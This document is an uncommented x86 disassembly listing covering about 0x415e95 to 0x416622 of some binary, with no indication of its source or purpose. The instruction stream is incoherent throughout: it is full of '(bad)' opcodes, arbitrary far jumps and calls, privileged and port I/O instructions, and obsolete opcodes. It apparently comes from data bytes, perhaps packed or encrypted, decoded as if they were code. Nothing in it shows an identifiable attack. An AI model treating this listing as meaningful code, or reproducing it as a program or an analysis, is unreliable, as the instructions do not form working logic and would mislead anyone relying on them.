  415e95:	mov    ebx,edx
  415e97:	jns    0x415ee1
  415e99:	mov    ?,WORD PTR [ebp+0x62f80653]
  415e9f:	jle    0x415e66
  415ea1:	sub    dl,BYTE PTR [ecx-0x2b]
  415ea4:	in     al,dx
  415ea5:	or     ecx,DWORD PTR [ecx+0x2704b86e]
  415eab:	dec    ecx
  415eac:	stos   BYTE PTR es:[edi],al
  415ead:	dec    edx
  415eae:	nop
  415eaf:	les    ebp,FWORD PTR [edi]
  415eb1:	test   eax,0xefbc0a65
  415eb6:	xchg   edx,eax
  415eb7:	cmp    BYTE PTR [esi+0x6],ch
  415eba:	fisttp QWORD PTR [ecx]
  415ebc:	fneni(8087 only) 
  415ebe:	jne    0x415f0c
  415ec0:	mov    ecx,0x69b8140c
  415ec5:	mov    esp,0xcf6fc8a5
  415eca:	(bad)
  415ecd:	add    BYTE PTR [edi],cl
  415ecf:	add    dl,BYTE PTR [edi-0x2c]
  415ed2:	mov    ah,BYTE PTR [esi-0x6d]
  415ed5:	iret   
  415ed6:	dec    eax
  415ed7:	push   0x4e363dec
  415edc:	jns    0x415e8d
  415ede:	pop    esp
  415edf:	or     esi,edx
  415ee1:	mov    ds:0xebd3e49c,eax
  415ee6:	push   ebp
  415ee7:	shr    BYTE PTR ds:0x730f4390,0x4a
  415eee:	aam    0x97
  415ef0:	(bad)  
  415ef1:	neg    DWORD PTR [esi+0x2f]
  415ef4:	mov    eax,ds:0xa7b2bf9a
  415ef9:	xchg   edi,eax
  415efa:	jl     0x415f3f
  415efc:	or     eax,0x54d13289
  415f01:	cmp    edi,DWORD PTR [edi]
  415f03:	test   DWORD PTR [ecx+0x66d1dc1b],ecx
  415f09:	jmp    0xea9d:0x8188edb8
  415f10:	adc    BYTE PTR [eax],bl
  415f12:	repnz xor al,0x1b
  415f15:	sbb    eax,DWORD PTR [esi]
  415f17:	push   es
  415f18:	mov    cl,BYTE PTR [eax]
  415f1a:	xchg   ebx,eax
  415f1b:	shl    DWORD PTR [ecx-0x20],0x54
  415f1f:	sahf   
  415f20:	(bad)  
  415f21:	xlat   BYTE PTR ds:[ebx]
  415f22:	cs std 
  415f24:	mov    ?,WORD PTR [edi+0x77]
  415f27:	mov    bh,0x47
  415f29:	add    BYTE PTR [edx+ebp*4],cl
  415f2c:	add    BYTE PTR [ecx],ch
  415f2e:	push   eax
  415f2f:	cmc    
  415f30:	dec    ecx
  415f31:	stos   DWORD PTR es:[edi],eax
  415f32:	ins    DWORD PTR es:[edi],dx
  415f33:	pushf  
  415f34:	push   esp
  415f35:	inc    ecx
  415f37:	pop    esi
  415f38:	ret    0xfe2c
  415f3b:	aaa    
  415f3c:	xor    esp,edi
  415f3e:	push   esp
  415f3f:	adc    eax,0x3c211a73
  415f44:	test   al,0x99
  415f46:	cmp    ebp,DWORD PTR [ecx]
  415f48:	xlat   BYTE PTR ds:[ebx]
  415f49:	scas   al,BYTE PTR es:[edi]
  415f4a:	sub    BYTE PTR [ecx],ah
  415f4c:	fisubr DWORD PTR [ecx+0x3d]
  415f4f:	(bad)  
  415f50:	cdq    
  415f51:	cmp    eax,0x12ad4a9
  415f56:	retf   
  415f57:	jge    0x415f28
  415f59:	push   edx
  415f5a:	aad    0x28
  415f5c:	jmp    0xbbc2:0xfdf6ce08
  415f63:	mov    ds:0xbc950fb2,eax
  415f68:	stc    
  415f69:	jecxz  0x415f7b
  415f6b:	xchg   ebp,eax
  415f6c:	cmp    ebx,DWORD PTR [esi]
  415f6e:	(bad)  
  415f6f:	repz mov cl,0x19
  415f72:	sbb    eax,0x2c481575
  415f77:	inc    di
  415f79:	mov    edx,esp
  415f7b:	cmp    ah,BYTE PTR [edi+0x648d04cb]
  415f81:	sbb    eax,0x1514f9db
  415f86:	iret   
  415f87:	push   edi
  415f88:	add    eax,0x950db4c3
  415f8d:	sub    ecx,DWORD PTR [ebp+0x39]
  415f90:	xor    ecx,DWORD PTR [ecx]
  415f92:	(bad)  
  415f93:	pop    esp
  415f94:	fwait
  415f95:	push   ebp
  415f96:	adc    cl,BYTE PTR [edx+eiz*8]
  415f99:	cmp    al,0x9c
  415f9b:	or     edx,ebp
  415f9d:	mov    eax,ds:0x393afc42
  415fa2:	xor    al,0xee
  415fa4:	fcmovne st,st(1)
  415fa6:	push   0xb
  415fa8:	xchg   edx,eax
  415fa9:	imul   esp,edi,0x5d4b8f07
  415faf:	(bad)  
  415fb0:	pop    edx
  415fb1:	dec    ecx
  415fb2:	in     al,0x8d
  415fb4:	mov    DWORD PTR [edi],esi
  415fb6:	cdq    
  415fb7:	mov    edx,0x233ccaf7
  415fbc:	adc    BYTE PTR [bx+di-0x7bd8],bh
  415fc1:	and    esi,esp
  415fc3:	mov    ds:0x81a867d6,eax
  415fc8:	or     DWORD PTR [ecx-0x2d],edx
  415fcb:	jb     0x415ffe
  415fcd:	out    dx,eax
  415fce:	dec    esp
  415fcf:	xor    esi,edx
  415fd1:	lds    edi,FWORD PTR [esi-0x652c6984]
  415fd7:	jae    0x416001
  415fd9:	je     0x416029
  415fdb:	leave  
  415fdc:	(bad)  
  415fdd:	ret    
  415fde:	lahf   
  415fdf:	add    eax,0xcdb326de
  415fe4:	mov    bl,0xe2
  415fe6:	in     eax,0x6d
  415fe8:	dec    ebp
  415fe9:	ds in  al,dx
  415feb:	push   ss
  415fec:	fwait
  415fed:	inc    eax
  415fee:	sub    DWORD PTR [eax],ebp
  415ff0:	jmp    0xe0af0d85
  415ff5:	sbb    BYTE PTR [esi],ah
  415ff7:	push   edx
  415ff8:	int    0x5
  415ffa:	xor    ebp,DWORD PTR [ecx+0xaf18730]
  416000:	jo     0x416018
  416002:	ret    0x7a89
  416005:	pop    edx
  416006:	sub    eax,0x50159bff
  41600b:	sub    esp,0x7bc94e79
  416011:	push   ds
  416012:	shr    BYTE PTR [edx-0x7b],0xa9
  416016:	pop    ebp
  416017:	test   DWORD PTR [edx-0x2b],edi
  41601a:	retf   
  41601b:	popa   
  41601c:	cmp    al,0x2f
  41601e:	mov    dl,0xb6
  416020:	repz ror DWORD PTR [ebx+0x7f],1
  416024:	stos   DWORD PTR es:[edi],eax
  416025:	clc    
  416026:	mov    eax,ds:0x5ecec053
  41602b:	in     eax,dx
  41602c:	dec    eax
  41602d:	not    DWORD PTR [ebx-0x79]
  416030:	jae    0x415fde
  416032:	adc    eax,0xe01f6945
  416037:	addr16 aas 
  416039:	pop    ecx
  41603a:	std    
  41603b:	(bad)  
  41603c:	(bad)  
  41603d:	aam    0x77
  41603f:	inc    edx
  416040:	aaa    
  416041:	jmp    0xbbd1e07a
  416046:	mov    esi,0x5df680fa
  41604b:	sub    edi,DWORD PTR [ebp+0xa]
  41604e:	jbe    0x415ffb
  416050:	fnstenv [esi]
  416052:	leave  
  416053:	scas   eax,DWORD PTR es:[edi]
  416054:	addr16 fs (bad) 
  416057:	retf   
  416058:	or     dh,BYTE PTR [eax+0x40349afd]
  41605e:	call   0x5e50:0x60683b81
  416065:	adc    al,0x9c
  416067:	inc    edi
  416068:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416069:	inc    ebp
  41606a:	push   ecx
  41606b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41606c:	loop   0x41601d
  41606e:	jmp    0x4a62:0x9958d176
  416075:	inc    ebp
  416076:	inc    ecx
  416077:	xchg   edx,eax
  416078:	mov    ds:0x60e508ee,eax
  41607d:	or     BYTE PTR [esi+0x7b24bcfb],dh
  416083:	mov    cl,0xda
  416085:	xor    eax,DWORD PTR [edi-0x3e]
  416088:	mov    cs,edi
  41608a:	ror    edi,0x58
  41608d:	mov    fs,WORD PTR [ebp-0x695467ce]
  416093:	mov    ch,0xee
  416095:	repnz mov DWORD PTR [ebx+0x6],ebx
  416099:	pop    ds
  41609a:	retf   
  41609b:	or     bl,BYTE PTR [edx]
  41609d:	xor    edx,DWORD PTR [esi+eax*4-0x291a09d7]
  4160a4:	dec    ebx
  4160a5:	mov    bh,0xbd
  4160a7:	(bad)  
  4160a9:	(bad)  
  4160aa:	jmp    0xda7f:0x2ce4e658
  4160b1:	pop    esp
  4160b2:	or     al,0x25
  4160b4:	ds (bad) 
  4160b6:	pop    edi
  4160b7:	mov    bl,0x66
  4160b9:	xchg   ebp,eax
  4160ba:	dec    eax
  4160bb:	and    bl,dh
  4160bd:	pushf  
  4160be:	sub    dh,BYTE PTR [edi+ebx*2]
  4160c1:	daa    
  4160c2:	add    bl,BYTE PTR [esi+ebx*8]
  4160c5:	(bad)  
  4160c7:	sbb    eax,0xdcee4951
  4160cc:	inc    eax
  4160cd:	pushf  
  4160ce:	lds    eax,FWORD PTR [esi]
  4160d0:	mov    bl,0x76
  4160d2:	lds    ecx,FWORD PTR [eax+0x73]
  4160d5:	xchg   dh,al
  4160d7:	inc    ecx
  4160d8:	mov    eax,ds:0xb43e7aa5
  4160dd:	shl    DWORD PTR [ecx-0x2a],1
  4160e0:	xchg   ebp,eax
  4160e1:	hlt    
  4160e2:	pop    DWORD PTR [esi-0x2bb3c8b3]
  4160e8:	adc    BYTE PTR [ecx],ch
  4160ea:	inc    ecx
  4160eb:	fbld   TBYTE PTR [edx-0x165f6e1d]
  4160f1:	pop    edx
  4160f2:	dec    esp
  4160f3:	ja     0x4160c9
  4160f5:	out    0x6b,eax
  4160f7:	dec    ebp
  4160f8:	add    esi,eax
  4160fa:	(bad)
  4160fe:	push   edi
  4160ff:	mov    ds,WORD PTR [edx+0x2a597a59]
  416105:	fist   WORD PTR [bp+di-0x333b]
  41610a:	pop    ds
  41610b:	retf   0x4992
  41610e:	xor    al,0xe3
  416110:	and    edi,edx
  416112:	or     al,0xcc
  416114:	gs js  0x4160fa
  416117:	jne    0x41617c
  416119:	inc    ebx
  41611b:	(bad)  
  41611d:	scas   al,BYTE PTR es:[edi]
  41611e:	stc    
  41611f:	aam    0xfd
  416121:	jge    0x4160e2
  416123:	jg     0x416150
  416125:	in     al,0xd0
  416127:	ss test al,0xa5
  41612a:	mov    esi,0x43d1a29e
  41612f:	les    esi,FWORD PTR [esi]
  416131:	jno    0x416169
  416133:	pop    ebp
  416134:	lods   eax,DWORD PTR ds:[esi]
  416135:	cli    
  416136:	jae    0x41610d
  416138:	out    dx,eax
  416139:	jb     0x416196
  41613b:	repnz aaa 
  41613d:	inc    edx
  41613e:	hlt    
  41613f:	lods   al,BYTE PTR ds:[esi]
  416140:	pop    es
  416141:	add    BYTE PTR [edx+ecx*1+0x5f],0x9a
  416146:	je     0x416159
  416148:	jg     0x416183
  41614a:	xor    ebx,esp
  41614c:	pop    ds
  41614d:	or     BYTE PTR [ebx+0x10],dl
  416150:	add    eax,0xeca0b1e8
  416155:	xchg   esp,eax
  416156:	adc    ecx,DWORD PTR [edx]
  416158:	inc    eax
  416159:	xchg   BYTE PTR [edi+0x21],ch
  41615c:	add    DWORD PTR [edi],esi
  41615e:	out    dx,eax
  41615f:	jno    0x4161aa
  416161:	in     eax,0x76
  416163:	aas    
  416164:	and    eax,0xacb634a8
  416169:	jb     0x416121
  41616b:	retf   0x1f3e
  41616e:	sbb    DWORD PTR [esi-0x4d],ebx
  416171:	sbb    ah,al
  416173:	adc    BYTE PTR [esi],0x79
  416176:	dec    ebp
  416177:	push   0xd3fe425c
  41617c:	inc    esp
  41617d:	nop
  41617e:	nop
  41617f:	xlat   BYTE PTR ds:[ebx]
  416180:	fadd   QWORD PTR [eax-0x2a]
  416183:	jge    0x41611e
  416185:	pop    es
  416186:	icebp  
  416187:	sti    
  416188:	retf   0x9939
  41618b:	jno    0x416133
  41618d:	stos   DWORD PTR es:[edi],eax
  41618e:	scas   eax,DWORD PTR es:[edi]
  41618f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416190:	jb     0x4161dc
  416192:	push   edx
  416193:	adc    DWORD PTR [eax+0x4e],esi
  416196:	cs push edi
  416198:	xchg   esp,eax
  416199:	xor    ebx,DWORD PTR [edi-0x26]
  41619c:	gs das 
  41619e:	push   esp
  41619f:	sahf   
  4161a0:	ja     0x41620a
  4161a2:	dec    edi
  4161a3:	inc    ecx
  4161a4:	sub    DWORD PTR [edx+edx*4],0xb7724223
  4161ab:	push   0xfffffff6
  4161ad:	jmp    0xb9c7ceb7
  4161b2:	and    cl,ah
  4161b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4161b5:	in     al,0x25
  4161b7:	push   ss
  4161b8:	(bad)  
  4161b9:	sar    bh,0xdb
  4161bc:	loopne 0x4161e8
  4161be:	mov    ah,0xaa
  4161c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4161c1:	jecxz  0x416144
  4161c3:	add    al,0xb3
  4161c5:	jne    0x416181
  4161c7:	es scas al,BYTE PTR es:[edi]
  4161c9:	dec    eax
  4161ca:	clc    
  4161cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4161cc:	sti    
  4161cd:	ins    BYTE PTR es:[edi],dx
  4161ce:	lea    ebx,[esi-0xd]
  4161d1:	shl    BYTE PTR [ecx],0x49
  4161d4:	jno    0x4161b1
  4161d6:	adc    ebp,DWORD PTR [edx-0x460d6276]
  4161dc:	or     cl,BYTE PTR [eax]
  4161de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4161df:	dec    esi
  4161e0:	rol    edi,cl
  4161e2:	xor    BYTE PTR [ecx],dh
  4161e4:	in     eax,dx
  4161e5:	sbb    al,bh
  4161e7:	(bad)  
  4161e8:	in     eax,0x73
  4161ea:	cmp    esp,DWORD PTR [ebx+0x1fc4f419]
  4161f0:	pop    ebx
  4161f1:	pop    ss
  4161f2:	test   eax,0x46013267
  4161f7:	(bad)  
  4161f8:	data16 adc ah,dh
  4161fb:	xor    al,0xb
  4161fd:	out    0xbb,al
  4161ff:	lods   eax,DWORD PTR ds:[esi]
  416200:	sub    dl,BYTE PTR [esi-0x593e58bb]
  416206:	pop    es
  416207:	call   0x33e8:0x2c89cce4
  41620e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41620f:	adc    al,0xea
  416211:	aam    0x27
  416213:	mov    ebp,0xd13efc5d
  416218:	leave  
  416219:	xor    BYTE PTR [ebx+ebx*2],ah
  41621c:	xor    eax,0x992c24fb
  416221:	jl     0x416261
  416223:	test   eax,0xbcc739d5
  416228:	and    DWORD PTR [eax+0x2db7b11],edx
  41622e:	ficom  WORD PTR [eax+ebp*8-0x52c29d5]
  416235:	rdmsr  
  416237:	dec    ebx
  416238:	pop    es
  416239:	mov    ah,0x7f
  41623b:	in     eax,0x75
  41623d:	or     esi,edi
  41623f:	loop   0x416231
  416241:	fs jle 0x4161ee
  416244:	mov    cl,0xd1
  416246:	sbb    DWORD PTR [ebx],edx
  416248:	sub    eax,DWORD PTR [edx-0x5e566253]
  41624e:	fstp   st(1)
  416250:	sub    cl,BYTE PTR [ecx-0x4eeae127]
  416256:	rol    eax,1
  416258:	sbb    eax,0xcf043bfe
  41625d:	mov    ebp,0x5ed9da06
  416262:	mov    WORD PTR [eax],es
  416264:	fnstcw WORD PTR [edi-0x22145eb0]
  41626a:	mov    bl,0xec
  41626c:	push   eax
  41626d:	pop    ds
  41626e:	aas    
  41626f:	jo     0x41629a
  416271:	pop    ecx
  416272:	and    al,0x4f
  416274:	ins    DWORD PTR es:[edi],dx
  416275:	mov    edi,0xe30ffc98
  41627a:	dec    edi
  41627b:	inc    eax
  41627c:	cli    
  41627d:	push   es
  41627e:	lods   al,BYTE PTR ds:[esi]
  41627f:	js     0x4162e6
  416281:	xchg   ecx,eax
  416282:	les    ecx,FWORD PTR [esi]
  416284:	lds    esi,FWORD PTR [edi+esi*2]
  416287:	jnp    0x4162e5
  416289:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41628a:	test   DWORD PTR [edx],edx
  41628c:	(bad)  
  41628d:	push   ebp
  41628e:	sbb    bh,BYTE PTR [ebx]
  416290:	sbb    eax,0xbe3debfb
  416295:	sahf   
  416296:	int    0x13
  416298:	mov    bh,0x39
  41629a:	retf   
  41629b:	sahf   
  41629c:	test   eax,ebp
  41629e:	push   es
  41629f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4162a0:	into   
  4162a1:	imul   eax
  4162a3:	cmp    ebx,DWORD PTR [ebx]
  4162a5:	addr16 push ecx
  4162a7:	in     al,dx
  4162a8:	or     al,0xb4
  4162aa:	test   al,0xf3
  4162ac:	addr16 aaa 
  4162ae:	lea    edx,[ebx-0x1b1b8c9b]
  4162b4:	xchg   esi,eax
  4162b5:	frstor [ecx]
  4162b7:	out    dx,eax
  4162b8:	icebp  
  4162b9:	fldenv [edi+0x6b673334]
  4162bf:	rol    DWORD PTR [ecx+0x43],cl
  4162c2:	outs   dx,DWORD PTR ds:[esi]
  4162c3:	or     DWORD PTR [ecx],ecx
  4162c5:	lock aam 0x74
  4162c8:	and    DWORD PTR ds:0x3d831e9e,0xa50f89eb
  4162d2:	outs   dx,BYTE PTR ds:[esi]
  4162d3:	mov    edi,0xe32e7e46
  4162d8:	pop    esi
  4162d9:	(bad)  
  4162da:	fld    QWORD PTR [edx]
  4162dc:	sbb    al,0x76
  4162de:	aad    0x7c
  4162e0:	aas    
  4162e1:	jecxz  0x4162ad
  4162e3:	dec    ebp
  4162e4:	sbb    DWORD PTR [ebx-0x1450247d],edi
  4162ea:	add    edi,DWORD PTR [ebp+0x562db125]
  4162f0:	stos   BYTE PTR es:[edi],al
  4162f1:	stos   BYTE PTR es:[edi],al
  4162f2:	inc    esi
  4162f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4162f4:	mov    ebp,0x706ee8c
  4162f9:	sub    edi,DWORD PTR [ebx-0x61]
  4162fc:	mov    eax,0xe4f814e3
  416301:	iret   
  416302:	aaa    
  416303:	push   ds
  416304:	leave  
  416305:	ss mov ch,0xd
  416308:	es mov ah,0xd7
  41630b:	bound  esi,QWORD PTR [esp+ecx*4+0x53]
  41630f:	fst    st(5)
  416311:	sub    BYTE PTR [edx],0x61
  416314:	cmp    BYTE PTR [ebx],cl
  416316:	mov    BYTE PTR [edi-0x29],ch
  416319:	sbb    dh,BYTE PTR [esi+0x6a]
  41631c:	out    0xf1,eax
  41631e:	mov    eax,0xaacfc971
  416323:	cwde   
  416324:	cs loope 0x4162d4
  416327:	push   edi
  416328:	fstp   DWORD PTR [eax]
  41632a:	jnp    0x416345
  41632c:	psllw  mm6,QWORD PTR [edx+eax*4-0x56a9b626]
  416334:	mov    ah,0xbb
  416336:	sub    DWORD PTR [ebp-0x1f078e46],ecx
  41633c:	retf   
  41633d:	aas    
  41633e:	(bad)
  416341:	arpl   bx,sp
  416343:	aad    0x6c
  416345:	xchg   ebx,eax
  416346:	cwde   
  416347:	pop    ecx
  416348:	jnp    0x416378
  41634a:	in     eax,dx
  41634b:	nop
  41634c:	inc    edi
  41634d:	pusha  
  41634e:	mov    al,0x64
  416350:	or     edx,edx
  416352:	adc    DWORD PTR [edx],0xffffff89
  416355:	dec    esp
  416356:	call   0x7a41:0x767bdf8c
  41635d:	xchg   edi,eax
  41635e:	jnp    0x4163bd
  416360:	cmp    al,0xb2
  416362:	out    dx,eax
  416363:	sar    BYTE PTR [eax],0x7
  416366:	popf   
  416367:	mov    esp,0x6a32bde4
  41636c:	pop    eax
  41636d:	mov    ebx,0x67cfc6cb
  416372:	fnstenv [esp+ebp*4+0x7d]
  416376:	push   es
  416377:	rcr    DWORD PTR [ebx+ebp*8-0x13cef586],1
  41637e:	xchg   BYTE PTR [esi-0x16cc2180],dh
  416384:	and    ecx,DWORD PTR [edx+ebp*4-0x4b]
  416388:	int    0xbf
  41638a:	pusha  
  41638b:	dec    DWORD PTR [edi]
  41638d:	sub    edi,DWORD PTR [edi]
  41638f:	stos   BYTE PTR es:[edi],al
  416390:	mov    dh,0xfa
  416392:	pop    ds
  416393:	sbb    esi,DWORD PTR [esi*2+0x5fdb64db]
  41639a:	mov    dh,0x7f
  41639c:	push   ecx
  41639d:	outs   dx,BYTE PTR ds:[esi]
  41639e:	into   
  41639f:	fst    st(5)
  4163a1:	in     al,dx
  4163a2:	lea    edx,[ebx+eax*4-0x78a572c]
  4163a9:	ret    
  4163aa:	mov    ecx,DWORD PTR [esp+esi*2+0x2d]
  4163ae:	xor    cl,BYTE PTR [edi+0x6a]
  4163b1:	loop   0x416405
  4163b3:	xchg   al,ch
  4163b5:	(bad)  
  4163b6:	xor    edx,ecx
  4163b8:	leave  
  4163b9:	jo     0x9c4db71c
  4163bf:	adc    eax,0x4a0068a6
  4163c4:	call   0x6685:0x551c4d61
  4163cb:	jb     0x416410
  4163cd:	and    eax,0xb478a20
  4163d2:	je     0x4163e4
  4163d4:	jno    0x4163c6
  4163d6:	mov    eax,ds:0x6419fac7
  4163db:	add    DWORD PTR [eax],edx
  4163dd:	fld    DWORD PTR [esi+0xecf94e0]
  4163e3:	nop
  4163e4:	enter  0xad97,0xba
  4163e8:	addr16 push esp
  4163ea:	cmp    ebx,DWORD PTR [eax+esi*8-0x4bf7a5fd]
  4163f1:	mov    ebx,ebx
  4163f3:	or     ch,BYTE PTR [esi-0x2c666ba8]
  4163f9:	add    ecx,DWORD PTR [edx-0x59]
  4163fc:	loop   0x41640a
  4163fe:	mov    edx,0xb417fde9
  416403:	dec    edx
  416404:	sub    bh,BYTE PTR [edi-0x61]
  416407:	shr    DWORD PTR [ebp-0x315f98a6],0x4e
  41640e:	or     bh,cl
  416410:	xchg   ebp,eax
  416411:	ficom  DWORD PTR [edx-0x4b]
  416414:	fbstp  TBYTE PTR [edx+0x60]
  416417:	cli    
  416418:	pushf  
  416419:	jmp    0x2439:0x947a07ec
  416420:	sbb    al,0xcf
  416422:	into   
  416423:	dec    edx
  416424:	stos   DWORD PTR es:[edi],eax
  416425:	jne    0x41649e
  416427:	repnz inc edx
  416429:	ins    DWORD PTR es:[edi],dx
  41642a:	jmp    0x5054:0x19f26616
  416431:	jle    0x416429
  416433:	out    0x81,al
  416435:	aaa    
  416436:	add    al,0xec
  416438:	pop    eax
  416439:	cdq    
  41643a:	jle    0x4164a8
  41643c:	pop    eax
  41643d:	repz mov al,ds:0xd3068732
  416444:	inc    esp
  416445:	es cmp eax,0xa5913e21
  41644b:	jo     0x41649e
  41644d:	inc    edi
  41644e:	xor    DWORD PTR [ebx-0x33],edx
  416451:	mov    BYTE PTR [ecx+0x5],al
  416454:	add    al,0xec
  416456:	retf   
  416457:	and    BYTE PTR [ecx],ah
  416459:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41645a:	and    eax,0xf6a94b72
  41645f:	aad    0x8d
  416461:	mov    ds:0xc5df088b,eax
  416466:	cmp    DWORD PTR [edi+0x71cd5aa9],ebp
  41646c:	xor    cl,BYTE PTR [esi+0x27]
  41646f:	adc    eax,DWORD PTR [edx-0x42]
  416472:	inc    edx
  416473:	popa   
  416474:	jo     0x4164a7
  416476:	fadd   QWORD PTR [eax]
  416478:	xchg   esp,eax
  416479:	imul   edi,DWORD PTR [eax],0xffffff9e
  41647c:	ja     0x4164f2
  41647e:	rcr    BYTE PTR [eax],cl
  416480:	pushf  
  416481:	mov    ecx,DWORD PTR ds:0xada7fda4
  416487:	cmp    ecx,DWORD PTR [eax]
  416489:	dec    eax
  41648a:	inc    eax
  41648b:	pop    ebp
  41648c:	xor    eax,0x7c1f03ab
  416491:	pop    esp
  416492:	lahf   
  416493:	aam    0xd3
  416495:	shl    BYTE PTR [ebx-0x7c],cl
  416498:	jl     0x4164ae
  41649a:	nop
  41649b:	je     0x41646a
  41649d:	or     al,0x4b
  41649f:	jo     0x4164fd
  4164a1:	jmp    0xdf55:0x77198b6a
  4164a8:	inc    ecx
  4164a9:	jp     0x4164e7
  4164ab:	mov    esp,0x5cecf812
  4164b0:	mov    eax,ds:0xb912531e
  4164b5:	mov    ah,0xf5
  4164b7:	sbb    al,0x6b
  4164b9:	test   eax,0x7e9fa799
  4164be:	pop    eax
  4164bf:	jbe    0x416494
  4164c1:	ret    
  4164c2:	xchg   DWORD PTR [eax-0x29b55005],ebx
  4164c8:	mov    cl,0xf7
  4164ca:	and    DWORD PTR [edx-0x70939ee2],eax
  4164d0:	lea    eax,[edx]
  4164d2:	int    0xe2
  4164d4:	retf   
  4164d5:	xchg   esi,eax
  4164d6:	in     al,0x1c
  4164d8:	dec    eax
  4164d9:	pop    ds
  4164da:	cmp    BYTE PTR [edi-0x22184a08],al
  4164e0:	imul   edi,ebp,0xffffff88
  4164e3:	icebp  
  4164e4:	xchg   esp,eax
  4164e5:	inc    esi
  4164e6:	jge    0x4164da
  4164e8:	or     ebp,DWORD PTR [esp+edi*8+0x16]
  4164ec:	jbe    0x416548
  4164ee:	sub    eax,0xea1fc548
  4164f3:	cwde   
  4164f4:	clc    
  4164f5:	adc    BYTE PTR [edi+0x103fdc],bl
  4164fb:	add    DWORD PTR [edx-0x3fdc3a89],edx
  416501:	stos   BYTE PTR es:[edi],al
  416502:	jbe    0x4164e9
  416504:	pushf  
  416505:	ret    
  416506:	retf   0xb25b
  416509:	mov    cl,0xaf
  41650b:	cmp    eax,0xbce9f7cb
  416510:	lea    edi,[esp+eax*8-0x5]
  416514:	dec    eax
  416515:	out    0xa5,eax
  416517:	cwde   
  416518:	push   ebx
  416519:	xor    al,0x80
  41651b:	and    BYTE PTR [ebp-0x67],ah
  41651e:	xor    dl,BYTE PTR [eax-0x35]
  416521:	mov    eax,0xa8f4bedf
  416526:	(bad)  
  416527:	enter  0x284e,0xc7
  41652b:	mov    esp,0xeb7dfcf2
  416530:	add    DWORD PTR [edi+0x6],ecx
  416533:	jmp    0x77704e
  416538:	adc    bh,BYTE PTR [edi+0x16]
  41653b:	sub    al,0x7d
  41653d:	and    BYTE PTR [edi+0x7417c99a],ch
  416543:	iret   
  416544:	adc    edx,DWORD PTR [ebx-0x74]
  416547:	cmp    DWORD PTR [edx],edi
  416549:	out    dx,al
  41654a:	test   eax,0x6cfb8de9
  41654f:	into   
  416550:	lahf   
  416551:	(bad)  
  416552:	sahf   
  416553:	or     eax,0x407f308a
  416558:	jne    0x416566
  41655a:	mov    gs,ebx
  41655c:	pop    ecx
  41655d:	inc    dx
  41655f:	ins    BYTE PTR es:[edi],dx
  416560:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416561:	sbb    al,0x1e
  416563:	ins    BYTE PTR es:[edi],dx
  416564:	imul   edx,DWORD PTR [eax-0x3596e68c],0x2e
  41656b:	jmp    0x4165df
  41656d:	in     eax,0x5f
  41656f:	aaa    
  416570:	in     al,dx
  416571:	or     DWORD PTR [ecx-0x28],ebp
  416574:	push   ecx
  416575:	add    dh,bh
  416577:	out    0x4a,eax
  416579:	xchg   esp,eax
  41657a:	dec    edx
  41657b:	lahf   
  41657c:	jno    0x4165d3
  41657e:	loope  0x416511
  416580:	dec    DWORD PTR [eax-0x24]
  416583:	adc    eax,0x8b52ae15
  416588:	shl    DWORD PTR [ebp-0x3c],cl
  41658b:	inc    esi
  41658c:	shr    ecx,cl
  41658e:	inc    ebp
  41658f:	cs sti 
  416591:	fldenv [edi]
  416593:	cwde   
  416594:	jae    0x416577
  416596:	xchg   esi,eax
  416597:	ins    BYTE PTR es:[edi],dx
  416598:	mov    dh,0x7b
  41659a:	push   0xffffffaa
  41659c:	bnd jp 0x416582
  41659f:	dec    edx
  4165a0:	add    ah,BYTE PTR ds:0xf5de2d5d
  4165a6:	sub    ebp,edi
  4165a8:	bound  ecx,QWORD PTR [ebp-0x16]
  4165ab:	mov    ?,WORD PTR [edi+ebp*8]
  4165ae:	mov    BYTE PTR [ebx-0x6fed8670],ch
  4165b4:	push   es
  4165b5:	pop    ebx
  4165b6:	sbb    BYTE PTR [ebx+0x16c517f0],ch
  4165bc:	add    al,0x8a
  4165be:	stos   BYTE PTR es:[edi],al
  4165bf:	mov    ds:0x143dab84,eax
  4165c4:	sbb    al,0xfb
  4165c6:	or     edi,edx
  4165c8:	and    esi,DWORD PTR [ebx+0x28]
  4165cb:	loop   0x4165c8
  4165cd:	fwait
  4165ce:	dec    eax
  4165cf:	push   0xffffffc2
  4165d1:	shr    DWORD PTR [edi],1
  4165d3:	mov    ebp,ss
  4165d5:	scas   al,BYTE PTR es:[edi]
  4165d6:	inc    eax
  4165d7:	dec    edx
  4165d8:	mov    al,ds:0x706bbd0f
  4165dd:	jns    0x41662c
  4165df:	es test eax,0xa750a846
  4165e5:	dec    edx
  4165e6:	stos   BYTE PTR es:[edi],al
  4165e7:	jno    0x416659
  4165e9:	ins    BYTE PTR es:[edi],dx
  4165ea:	inc    eax
  4165eb:	or     BYTE PTR gs:[bp+si+0x1d93],dh
  4165f1:	inc    ebp
  4165f2:	dec    ebx
  4165f3:	xchg   BYTE PTR [eax+0x47],bl
  4165f6:	jo     0x4165fc
  4165f8:	mov    bh,BYTE PTR [ebx]
  4165fa:	mov    bh,0xe3
  4165fc:	mov    dh,0xee
  4165fe:	pop    ecx
  4165ff:	sbb    DWORD PTR [eax+0x7b],edi
  416602:	imul   ebp,DWORD PTR [ebx],0x37
  416605:	xor    bl,BYTE PTR [eax]
  416607:	lods   eax,DWORD PTR ds:[esi]
  416608:	push   edx
  416609:	outs   dx,DWORD PTR ds:[esi]
  41660a:	mov    bh,0xce
  41660c:	xchg   edx,eax
  41660d:	mov    ch,0xd6
  41660f:	imul   esp,DWORD PTR [eax],0x61
  416612:	sbb    esp,DWORD PTR [ebx]
  416614:	fs mov dl,0xa4
  416617:	sahf   
  416618:	aad    0x1b
  41661a:	xchg   esp,eax
  41661b:	enter  0x4bda,0x5a
  41661f:	ja     0x4165ff
  416621:	xlat   BYTE PTR ds:[ebx]
  416622:	xchg   edi,eax
